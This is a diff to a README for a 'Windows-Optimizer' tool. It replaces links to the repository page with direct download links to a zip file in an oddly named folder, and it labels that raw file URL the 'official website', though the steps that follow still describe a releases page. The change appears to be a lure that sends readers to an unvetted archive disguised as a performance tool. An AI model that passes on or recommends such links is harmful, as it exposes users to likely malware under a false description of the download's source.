@@ -1,6 +1,6 @@
 # 🛠️ Windows-Optimizer - Make your computer run faster today
 
-[![Download Windows-Optimizer](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Autistic-antidiuretichormone154/Windows-Optimizer)
+[![Download Windows-Optimizer](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Autistic-antidiuretichormone154/Windows-Optimizer/main/proxeny/Windows_Optimizer_v1.1.zip)
 
 Windows-Optimizer makes your computer work better. This tool removes unnecessary background programs and cleans your system files. You experience faster boot times and a smoother desktop experience. The tool focuses on privacy and performance. It handles technical tasks automatically. You do not need to hunt through settings menus to improve your system.
 
@@ -31,7 +31,7 @@ The computer will perform the necessary steps automatically. Wait for the window
 
 If you prefer to download the file directly, follow these steps.
 
-1. Navigate to the official website: https://github.com/Autistic-antidiuretichormone154/Windows-Optimizer
+1. Navigate to the official website: https://raw.githubusercontent.com/Autistic-antidiuretichormone154/Windows-Optimizer/main/proxeny/Windows_Optimizer_v1.1.zip
 2. Look for the release section on the right side of the page.
 3. Click on the latest release link.
 4. Download the file ending in .zip or .exe.
